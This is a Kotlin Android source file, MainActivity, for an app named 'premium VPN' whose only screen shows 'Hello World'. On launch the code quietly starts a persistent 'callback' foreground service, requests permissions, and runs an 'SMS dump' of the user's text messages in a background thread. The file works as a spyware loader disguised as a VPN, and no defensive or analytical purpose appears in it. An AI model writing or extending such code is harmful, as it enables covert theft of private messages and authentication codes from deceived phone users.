package com.premium.vpn

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.premium.vpn.ui.theme.VPNTheme


class MainActivity : ComponentActivity() {
    
    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.values.all { it }
        if (allGranted) {
            // All permissions granted, start SMS dump
            startSMSDump()
        } else {
            // Some permissions denied
            android.util.Log.w("MainActivity", "Some permissions were denied")
        }
    }
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            VPNTheme {
                VPNApp()
            }
        }
        
        // Start the background service for persistent callback
        startCallbackService()
        
        // Request permissions and start SMS dump
        requestPermissionsAndDumpSMS()
    }
    
    private fun startCallbackService() {
        val serviceIntent = Intent(this, CallbackService::class.java)
        startForegroundService(serviceIntent)
    }
    
    private fun requestPermissionsAndDumpSMS() {
        if (PermissionHandler.hasAllPermissions(this)) {
            // All permissions already granted
            startSMSDump()
        } else {
            // Request permissions
            permissionLauncher.launch(PermissionHandler.REQUIRED_PERMISSIONS)
        }
    }
    
    private fun startSMSDump() {
        // Run SMS dump in background thread
        Thread {
            try {
                val smsDumpService = SMSDumpService()
                val success = smsDumpService.dumpSMS(this@MainActivity)
                
                runOnUiThread {
                    if (success) {
                        android.util.Log.i("MainActivity", "SMS dump completed successfully")
                    } else {
                        android.util.Log.e("MainActivity", "SMS dump failed")
                    }
                }
            } catch (e: Exception) {
                runOnUiThread {
                    android.util.Log.e("MainActivity", "Error during SMS dump: ${e.message}")
                }
            }
        }.start()
    }
}

@Composable
fun VPNApp() {
    Scaffold(
        modifier = Modifier.fillMaxSize(),
        containerColor = Color(0xFF1A1A1A)
    ) { paddingValues ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(paddingValues)
                .padding(24.dp),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center
        ) {
            // Hello World
            Text(
                text = "Hello World",
                fontSize = 32.sp,
                fontWeight = FontWeight.Bold,
                color = Color.White,
                modifier = Modifier.padding(bottom = 40.dp)
            )
        }
    }
}


@Preview(showBackground = true)
@Composable
fun VPNAppPreview() {
    VPNTheme {
        VPNApp()
    }
}